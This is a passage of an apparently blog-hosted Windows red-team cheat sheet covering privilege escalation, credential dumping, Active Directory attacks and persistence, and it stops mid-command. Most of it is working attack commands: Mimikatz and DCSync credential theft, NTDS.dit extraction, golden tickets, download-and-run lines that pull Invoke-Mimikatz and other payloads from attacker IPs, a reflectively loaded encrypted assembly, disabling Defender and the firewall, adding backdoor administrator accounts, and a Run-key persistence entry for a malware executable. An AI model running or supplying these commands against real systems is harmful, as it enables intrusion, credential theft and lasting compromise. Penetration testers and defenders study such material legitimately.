Drives"></a>View Connected Drives</h4><pre><code>net usewmic logicaldisk get caption,descriptionGet-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root</code></pre><h4 id="View-Privs"><a href="#View-Privs" class="headerlink" title="View Privs"></a>View Privs</h4><pre><code>whoami /privLook for SeImpersonate, SeDebugPrivilege etc</code></pre><h4 id="Is-Anyone-Else-Logged-In"><a href="#Is-Anyone-Else-Logged-In" class="headerlink" title="Is Anyone Else Logged In?"></a>Is Anyone Else Logged In?</h4><pre><code>qwinsta</code></pre><h4 id="View-Registry-Auto-Login"><a href="#View-Registry-Auto-Login" class="headerlink" title="View Registry Auto-Login"></a>View Registry Auto-Login</h4><pre><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39; | select &quot;Default*&quot;</code></pre><h4 id="View-Stored-Creds-in-Credential-Manager"><a href="#View-Stored-Creds-in-Credential-Manager" class="headerlink" title="View Stored Creds in Credential Manager"></a>View Stored Creds in Credential Manager</h4><pre><code>cmdkey /listdir C:\Users\username\AppData\Local\Microsoft\Credentials\dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</code></pre><h4 id="View-Unquoted-Service-Paths"><a href="#View-Unquoted-Service-Paths" class="headerlink" title="View Unquoted Service Paths"></a>View Unquoted Service Paths</h4><pre><code>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &#39;&quot;*&#39;} | select PathName,DisplayName,Name</code></pre><h4 id="View-Startup-Items"><a href="#View-Startup-Items" class="headerlink" title="View Startup Items"></a>View Startup Items</h4><pre><code>wmic startup get caption,commandreg query HKLM\Software\Microsoft\Windows\CurrentVersion\Runreg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOncereg query HKCU\Software\Microsoft\Windows\CurrentVersion\Runreg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOncedir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</code></pre><h4 id="Check-for-AlwaysInstalledElevated-Reg-Key"><a href="#Check-for-AlwaysInstalledElevated-Reg-Key" class="headerlink" title="Check for AlwaysInstalledElevated Reg Key"></a>Check for AlwaysInstalledElevated Reg Key</h4><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedGet-ItemProperty HKLM\Software\Policies\Microsoft\Windows\InstallerGet-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installerreg query HKLM\Software\Policies\Microsoft\Windows\Installerreg query HKCU\Software\Policies\Microsoft\Windows\Installer</code></pre><h4 id="Any-Passwords-in-Registry"><a href="#Any-Passwords-in-Registry" class="headerlink" title="Any Passwords in Registry?"></a>Any Passwords in Registry?</h4><pre><code>reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s </code></pre><h4 id="Any-Sysrep-or-Unattend-Files-Left-Over"><a href="#Any-Sysrep-or-Unattend-Files-Left-Over" class="headerlink" title="Any Sysrep or Unattend Files Left Over"></a>Any Sysrep or Unattend Files Left Over</h4><pre><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nulGet-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)}</code></pre><h4 id="GPP-Group-Policy-Preferences-Passwords"><a href="#GPP-Group-Policy-Preferences-Passwords" class="headerlink" title="GPP (Group Policy Preferences) Passwords"></a>GPP (Group Policy Preferences) Passwords</h4><pre><code>smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan\m0chanAD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Groups\http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For DecryptionCan also use PowerUP.ps1</code></pre><h4 id="Dump-Chrome-Passwords-Also-Post-Exploit"><a href="#Dump-Chrome-Passwords-Also-Post-Exploit" class="headerlink" title="Dump Chrome Passwords (Also Post Exploit)"></a>Dump Chrome Passwords (Also Post Exploit)</h4><pre><code>#git clone https://github.com/rasta-mouse/CookieMonsterCookieMonster credsCookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.Can also use Mimikatz for this.mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotectmimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</code></pre><h4 id="Dump-KeePass"><a href="#Dump-KeePass" class="headerlink" title="Dump KeePass"></a>Dump KeePass</h4><pre><code>#https://github.com/HarmJ0y/KeeThief#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/Get-Process keepasstasklist | findstr keepassAttacking KeePass#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1Import-Module KeeThief.ps1Get-KeePassDatabaseKey -VerboseKeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</code></pre><h4 id="Token-Impersonation"><a href="#Token-Impersonation" class="headerlink" title="Token Impersonation"></a>Token Impersonation</h4><pre><code>https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)#Tokenvator https://github.com/0xbadjuju/TokenvatorReflectively Load it with Powershell, Cobalt, SilentTrinity etc...$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%{$_-bxor$k[$i++%$k.length]}[System.Reflection.Assembly]::Load($b) | Out-Null$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)[namespace.Class]::Main($parameters)Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</code></pre><h4 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h4><pre><code>#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)#Reference https://ohpe.it/juicy-potato/Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.5:8000/JuicyPotato.exe&#39;,&#39;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&#39;)JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}Mochan.exe = Payload5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISDA CLSID is a GUID that identifies a COM class objectCan also use -A flag to specify arguments alongside cmd.exe/powershell.exe etcJUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><pre><code>#Check my Blog Post Kerberos Attacks in Depth for Further Information#https://m0chan.github.io/Kerberos-Attacks-In-DepthGet-DomainSPNTicket -Credential $cred -OutputFormat hashcatbecause Hashcat over John anyday right?Invoke-Kerberoast.ps1python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccountOfc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</code></pre><h4 id="Kerberoast-with-Python"><a href="#Kerberoast-with-Python" class="headerlink" title="Kerberoast with Python"></a>Kerberoast with Python</h4><pre><code>#https://github.com/skelsec/kerberoastIMPORTANT: the accepted formats are the following&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;Look for vulnerable users via LDAPkerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenumUse ASREP roast against users in the ldapenum_asrep_users.txt filekerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txtUse SPN roast against users in the ldapenum_spn_users.txt filekerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</code></pre><h4 id="AS-Rep-Roasting"><a href="#AS-Rep-Roasting" class="headerlink" title="AS Rep Roasting"></a>AS Rep Roasting</h4><pre><code>#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerableGet-ASRepHash -Domain m0chanAD.local -User victimCan also use Rebeus (Reflectively Load .NET Assembly.).\Rubeus.exe asreproast</code></pre><h4 id="DCSync-Also-Post-Exploit"><a href="#DCSync-Also-Post-Exploit" class="headerlink" title="DCSync (Also Post Exploit)"></a>DCSync (Also Post Exploit)</h4><pre><code>#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. #and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)mimikatz # lsadump::dcsync /domain:corp.local /user:Administratorpowershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.6:8000/Invoke-DCSync.ps1&#39;); Invoke-DCSync -PWDumpFormat&quot;Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</code></pre><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h4 id="Useful-Commands"><a href="#Useful-Commands" class="headerlink" title="Useful Commands"></a>Useful Commands</h4><pre><code>net user m0chan /add /domainnet localgroup Administrators m0chan /add# Enable RDPreg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /fTurn firewall offnetsh firewall set opmode disableOr like thisreg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /fIf you get this error:CredSSP Error Fix -&gt;Add this reg key:reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /fDisable Windows DefenderSet-MpPreference -DisableRealtimeMonitoring $true</code></pre><h4 id="Esenutl-exe-Dump-Locked-File"><a href="#Esenutl-exe-Dump-Locked-File" class="headerlink" title="Esenutl.exe Dump Locked File"></a>Esenutl.exe Dump Locked File</h4><pre><code>C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</code></pre><h4 id="Check-if-Powershell-Logging-is-Enabled"><a href="#Check-if-Powershell-Logging-is-Enabled" class="headerlink" title="Check if Powershell Logging is Enabled"></a>Check if Powershell Logging is Enabled</h4><pre><code>reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</code></pre><h4 id="Run-Seatbelt-ABSOLUTELY-MUST"><a href="#Run-Seatbelt-ABSOLUTELY-MUST" class="headerlink" title="Run Seatbelt (ABSOLUTELY MUST)"></a>Run Seatbelt (ABSOLUTELY MUST)</h4><pre><code>#https://github.com/GhostPack/SeatbeltThis is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win WinBasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)UACSystemPolicies     -   UAC system policies via the registryPowerShellSettings    -   PowerShell versions and security settingsAuditSettings         -   Audit settings via the registryWEFSettings           -   Windows Event Forwarding (WEF) settings via the registryLSASettings           -   LSA settings (including auth packages)UserEnvVariables      -   Current user environment variablesSystemEnvVariables    -   Current system environment variablesUserFolders           -   Folders in C:\Users\NonstandardServices   -   Services with file info company names that don&#39;t contain &#39;Microsoft&#39;InternetSettings      -   Internet settings including proxy configsLapsSettings          -   LAPS settings, if installedLocalGroupMembers     -   Members of local admins, RDP, and DCOMMappedDrives          -   Mapped drivesRDPSessions           -   Current incoming RDP sessionsWMIMappedDrives       -   Mapped drives via WMINetworkShares         -   Network sharesFirewallRules         -   Deny firewall rules, &quot;full&quot; dumps allAntiVirusWMI          -   Registered antivirus (via WMI)InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin toolsRegistryAutoRuns      -   Registry autorunsRegistryAutoLogon     -   Registry autologon informationDNSCache              -   DNS cache entries (via WMI)ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)AllTcpConnections     -   Lists current TCP connections and associated processesAllUdpConnections     -   Lists current UDP connections and associated processesNonstandardProcesses  -   Running processeswith file info company names that don&#39;t contain &#39;Microsoft&#39;  *  If the user is in high integrity, the following additional actions are run:SysmonConfig          -   Sysmon configuration from the registryAnd more!!</code></pre><h4 id="Dump-Creds"><a href="#Dump-Creds" class="headerlink" title="Dump Creds"></a>Dump Creds</h4><pre><code>(new-object System.Net.WebClient).DownloadString(&#39;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.mimikatz.exeprivlege::debugsekurlsa::logonPasswords fullThe safer method is to dump the process memory of LSASS.exe with MiniDump (https://github.com/3xpl01tc0d3r/Minidump)(or) https://github.com/GhostPack/SharpDumpand send the .bin to Mimikatz locally.sekurlsa::minidump C:\users\m0chan\lssas.dmpCan also be used for dumping and pass the ticket attacks but will cover this elsewhere.Mimikatz Guide#Logon Sessionssekurlsa::logonPasswords all#Dump Cachelsadump::cache#Dump SAMlsadump::sam</code></pre><h4 id="Dump-Creds-2"><a href="#Dump-Creds-2" class="headerlink" title="Dump Creds #2"></a>Dump Creds #2</h4><pre><code>#https://github.com/AlessandroZ/LaZagnelaZagne.exe alllaZagne.exe browserslaZagne.exe browsers -firefox</code></pre><h4 id="SessionGopher"><a href="#SessionGopher" class="headerlink" title="SessionGopher"></a>SessionGopher</h4><pre><code>#https://github.com/Arvanaghi/SessionGopherQuietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDPSessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminalsInvoke-SessionGopher -ThoroughImport-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</code></pre><h4 id="Dump-Chrome-Passwords-Also-Post-Exploit-1"><a href="#Dump-Chrome-Passwords-Also-Post-Exploit-1" class="headerlink" title="Dump Chrome Passwords (Also Post Exploit)"></a>Dump Chrome Passwords (Also Post Exploit)</h4><pre><code>#git clone https://github.com/rasta-mouse/CookieMonsterCookieMonster credsCookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.Can also use Mimikatz for this.mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotectmimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</code></pre><h4 id="Dump-Process-Memory-w-Mimikittenz"><a href="#Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="Dump Process Memory w/ Mimikittenz"></a>Dump Process Memory w/ Mimikittenz</h4><pre><code>#https://github.com/putterpanda/mimikittenzmimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.Invoke-Mimikittenz</code></pre><h4 id="Dump-KeePass-1"><a href="#Dump-KeePass-1" class="headerlink" title="Dump KeePass"></a>Dump KeePass</h4><pre><code>#https://github.com/HarmJ0y/KeeThief#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/Get-Process keepasstasklist | findstr keepassAttacking KeePass#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1Import-Module KeeThief.ps1Get-KeePassDatabaseKey -VerboseKeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</code></pre><h4 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h4><pre><code>#https://github.com/skelsec/pypykatzFull python implementation of Mimikatz :D pip3 install pypykatz</code></pre><h4 id="SafetyKatz"><a href="#SafetyKatz" class="headerlink" title="SafetyKatz"></a>SafetyKatz</h4><pre><code>#https://github.com/GhostPack/SafetyKatzFull C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D &quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&#39;s .NET PE Loader.First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</code></pre><h4 id="SharpDPAPI"><a href="#SharpDPAPI" class="headerlink" title="SharpDPAPI"></a>SharpDPAPI</h4><pre><code>#https://github.com/GhostPack/SharpDPAPIFull C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</code></pre><h4 id="SharpSniper"><a href="#SharpSniper" class="headerlink" title="SharpSniper"></a>SharpSniper</h4><pre><code>#https://github.com/HunnicCyber/SharpSniperOften a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.SharpSniper is a simple tool to find the IP address of these users so that you can target their box.C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123User: emusk - IP Address: 192.168.37.130</code></pre><h4 id="SharpLocker"><a href="#SharpLocker" class="headerlink" title="SharpLocker"></a>SharpLocker</h4><pre><code>#https://github.com/Pickfordmatt/SharpLockerSharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</code></pre><h4 id="Check-for-Missing-KB’s"><a href="#Check-for-Missing-KB’s" class="headerlink" title="Check for Missing KB’s"></a>Check for Missing KB’s</h4><pre><code>watson.exeSherlock.ps1Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)https://github.com/rasta-mouse/Watson</code></pre><h4 id="Decrypt-EFS-Files-with-Mimikatz-if-Admin-System"><a href="#Decrypt-EFS-Files-with-Mimikatz-if-Admin-System" class="headerlink" title="Decrypt EFS Files with Mimikatz if Admin/System"></a>Decrypt EFS Files with Mimikatz if Admin/System</h4><pre><code>#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-filescipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.privilege::debug token::elevate crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /exportdpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80bopenssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pemopenssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pemopenssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfxcertutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</code></pre><h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><pre><code>https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info findstr /C:&quot;&lt;autoElevate&gt;true&quot; C:\Windows\SysWOW64\SystemPropertiesAdvanced.exeC:\Windows\SysWOW64\SystemPropertiesComputerName.exeC:\Windows\SysWOW64\SystemPropertiesHardware.exeC:\Windows\SysWOW64\SystemPropertiesProtection.exeC:\Windows\SysWOW64\SystemPropertiesRemote.exe</code></pre><h4 id="Golden-Ticket-Attack"><a href="#Golden-Ticket-Attack" class="headerlink" title="Golden Ticket Attack"></a>Golden Ticket Attack</h4><pre><code>#Check my Blog Post Kerberos Attacks in Depth for Further Information#https://m0chan.github.io/Kerberos-Attacks-In-Depth# To generate the TGT with NTLMmimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;# To generate the TGT with AES 128 keymimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;# Inject TGT with Mimikatzmimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;#Inject Ticket with Rebeus.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</code></pre><h4 id="Child-Domain-to-Forest-Compromise"><a href="#Child-Domain-to-Forest-Compromise" class="headerlink" title="Child Domain to Forest Compromise"></a>Child Domain to Forest Compromise</h4><pre><code>Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DCTree = Set of domains using same name space (DNS Name)Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.Forest = Largest Structure composed of all trees.Most trees are linked with dual sided trust relationships to allow for sharing of resources.By default the first domain created if the Forest Root.Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create Covert-NameToSid target.domain.com\krbtgtS-1-5-21-2941561648-383941485-1389968811-502Replace 502 with 519 to represent Enterprise AdminsCreate golden ticket and attack parent domain. This will not work if there is SID Filtering in place for respective target domain.harmj0ys article explains it best. #http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</code></pre><h4 id="Dump-NTDS-dit"><a href="#Dump-NTDS-dit" class="headerlink" title="Dump NTDS.dit"></a>Dump NTDS.dit</h4><pre><code>C:\vssadmin create shadow /for=C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM.reg SAVE HKLM\SYSTEM c:\SYSvssadmin delete shadows /for= [/oldest | /all | /shadow=]If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</code></pre><h4 id="SeBackupPrivlege-Dump-NTDS-dit"><a href="#SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="SeBackupPrivlege - Dump NTDS.dit"></a>SeBackupPrivlege - Dump NTDS.dit</h4><pre><code>Import-Module .\SeBackupPrivilegeCmdLets.dllImport-Module .\SeBackupPrivilegeUtils.dllPS C:\m0chan&gt; Get-SeBackupPrivilegeSeBackupPrivilege is disabledPS C:\m0chan&gt; Set-SeBackupPrivilegePS C:\m0chan&gt; Get-SeBackupPrivilegeSeBackupPrivilege is enabledPS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -OverwriteCopied 12582912 bytesUse diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit Remember and not use C:\Windows\ntds\ntds.ditreg.exe save hklm\system c:\m0chan\SYSTEM.bak</code></pre><h2 id="Persistance"><a href="#Persistance" class="headerlink" title="Persistance"></a>Persistance</h2><h4 id="SSH-Shuttle"><a href="#SSH-Shuttle" class="headerlink" title="SSH Shuttle"></a>SSH Shuttle</h4><pre><code>./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</code></pre><h4 id="SharPersist"><a href="#SharPersist" class="headerlink" title="SharPersist"></a>SharPersist</h4><pre><code>#https://github.com/fireeye/SharPersistC# Libary Designed by FireEye to aid with Persistance using various techniques such as KeePass BackdoorReg KeySch Task BackdoorStartup Folder (Link File)Service BackdoorSee there github linked above for full Syntax, very cool work</code></pre><h4 id="SharpDoor"><a href="#SharpDoor" class="headerlink" title="SharpDoor"></a>SharpDoor</h4><pre><code>#https://github.com/infosecn1nja/SharpDoor.gitSharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</code></pre><h4 id="AutoRun-Registry"><a href="#AutoRun-Registry" class="headerlink" title="AutoRun Registry"></a>AutoRun Registry</h4><pre><code>[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce][HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices][HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce][HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</code></pre><h4 id="Run-amp-Run-Once"><a href="#Run-amp-Run-Once" class="headerlink" title="Run &amp; Run Once"></a>Run &amp; Run Once</h4><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</code></pre><h4 id="Scheduled-Tasks-1"><a href="#Scheduled-Tasks-1" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h4><pre><code>#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.schtasks /create /sc minute 